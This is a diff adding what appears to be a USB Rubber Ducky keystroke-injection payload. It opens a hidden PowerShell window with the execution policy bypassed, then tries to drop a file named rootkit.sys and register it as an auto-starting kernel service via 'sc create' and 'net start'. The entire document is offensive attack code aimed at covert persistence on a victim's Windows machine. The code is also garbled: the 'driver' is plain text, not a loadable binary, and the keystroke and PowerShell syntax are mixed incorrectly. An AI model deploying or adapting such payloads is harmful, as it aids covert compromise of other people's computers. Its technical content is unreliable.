@@ -1,0 +1,21 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Rootkit
+$string = @"
+`$rootkitPath = "$env:TEMP\rootkit.sys"
+`$rootkitCode = @"
+`[DllImport("ntdll.dll")]
+public static extern int NtCreateFile(out IntPtr handle, uint accessMask, ref OBJECT_ATTRIBUTES objAttributes, ref IO_STATUS_BLOCK ioStatusBlock, IntPtr allocationSize, uint fileAttributes, uint shareAccess, uint createDisposition, uint createOptions, IntPtr eaBuffer, uint eaLength);
+"@
+`$bytes = [System.Text.Encoding]::UTF8.GetBytes($rootkitCode)
+`$bytes | Out-File -FilePath $rootkitPath -Encoding Byte
+sc create Rootkit type= kernel binPath= $rootkitPath start= auto
+net start Rootkit
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
